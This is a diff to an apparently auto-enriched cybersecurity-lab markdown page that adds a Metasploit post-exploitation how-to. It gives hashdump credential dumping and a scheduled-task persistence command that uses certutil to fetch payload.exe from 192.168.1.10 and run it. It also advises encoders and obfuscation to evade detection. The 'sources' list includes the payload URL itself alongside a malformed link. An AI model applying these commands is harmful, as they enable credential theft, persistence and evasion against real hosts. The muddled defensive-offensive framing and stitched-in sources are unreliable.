@@ -331,6 +331,45 @@ detection:
 | MITRE ATT&CK | T1203 – Exploitation for Client Execution |
 | Source URL | [https://attack.mitre.org/techniques/T1203/](https://attack.mitre.org/techniques/T1203/) |
 
+
+### Essential Commands & Features
+
+Beyond basic scanning and module loading, effective Metasploit workflow requires mastering exploit execution, payload switching, and post-exploitation modules. Use `exploit` (or `exploit -j` to launch as a background job) to execute an exploit; `check` probes whether a target is vulnerable without exploitation. When setting a payload, `set payload windows/x64/meterpreter/reverse_tcp` is common. To switch payloads mid-session, `sessions -u <ID>` upgrades a shell to Meterpreter.
+
+Post-exploitation modules extend control. For credential dumping, use `post/windows/gather/hashdump` (MITRE ATT&CK [T1003.001] – OS Credential Dumping: LSASS Memory). Example:  
+`use post/windows/gather/hashdump`  
+`set session 1`  
+`run`  
+
+To persist via scheduled tasks, `post/windows/manage/scheduleme` creates a task that reconnects a payload. Example:  
+`use post/windows/manage/scheduleme`  
+`set session 1`  
+`set CMD "cmd.exe /c certutil -urlcache -f http://192.168.1.10/payload.exe %TEMP%\upd.exe & %TEMP%\upd.exe"`  
+`run`  
+
+This maps to MITRE ATT&CK [T1053.005] (Scheduled Task/Job: Scheduled Task). Another key command is `background` to push a Meterpreter session into the background, then `sessions -i` to interact.
+
+These capabilities move the operator from basic scanning to full lifecycle operations, directly aligning with offensive workflows.
+
+**Sources:**  
+- Rapid7 Metasploit Post-Exploitation Guide: https://blog.rapid7.com/2012/01/27/metasploit-post-exploitation/  
+- SANS Metasploit Cheat Sheet: https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+
+### Common Pitfalls & Result Validation
+
+When using Metasploit, analysts often fall into traps that lead to false positives or missed detections. A frequent mistake is **over-relying on default payloads** (e.g., `windows/meterpreter/reverse_tcp`), which may trigger signature-based defenses. Instead, customize payloads using encoders (e.g., `shikata_ga_nai`) or obfuscation techniques to evade detection. Another pitfall is **ignoring session stability**: Meterpreter sessions can die silently if the target process crashes or network conditions change. Validate session persistence by migrating to a stable process (e.g., `migrate -N explorer.exe`) and monitoring for reconnection attempts.
+
+False conclusions often arise from **misinterpreting exploit output**. For example, a successful `exploit` command doesn’t guarantee code execution—validate by checking for follow-on activity like **Process Injection (T1055.003)** or **Lateral Tool Transfer (T1570)**. Use `post` modules (e.g., `post/windows/gather/enum_logged_on_users`) to confirm impact. Additionally, **network noise** can obscure findings; filter irrelevant traffic by cross-referencing with known adversary techniques like **Non-Application Layer Protocol (T1095)**, which uses raw sockets for C2.
+
+To avoid pitfalls:
+1. **Validate exploit success** with multiple indicators (e.g., process listings, network connections).
+2. **Test in isolated environments** to distinguish false positives from true positives.
+3. **Document session artifacts** (e.g., registry keys, dropped files) to correlate with MITRE ATT&CK techniques.
+
+**Sources:**
+- [MITRE ATT&CK: Process Injection (T1055.003)](https://attack.mitre.org/techniques/T1055/003/)
+- [Rapid7: Metasploit Framework Documentation - Payloads](https://www.rapid7.com/blog/post/2021/08/11/metasploit-framework-6-0-released/)
+
 ## Sources
 Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, or Security Onion docs):
 
@@ -388,3 +427,10 @@ Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, o
 - https://attack.mitre.org/techniques/T1203/](https://attack.mitre.org/techniques/T1203/
 
 <!-- cyberlab-enriched: v5 -->
+- http://192.168.1.10/payload.exe
+- https://blog.rapid7.com/2012/01/27/metasploit-post-exploitation/
+- https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+- https://attack.mitre.org/techniques/T1055/003/
+- https://www.rapid7.com/blog/post/2021/08/11/metasploit-framework-6-0-released/
+
+<!-- cyberlab-enriched: v6 -->
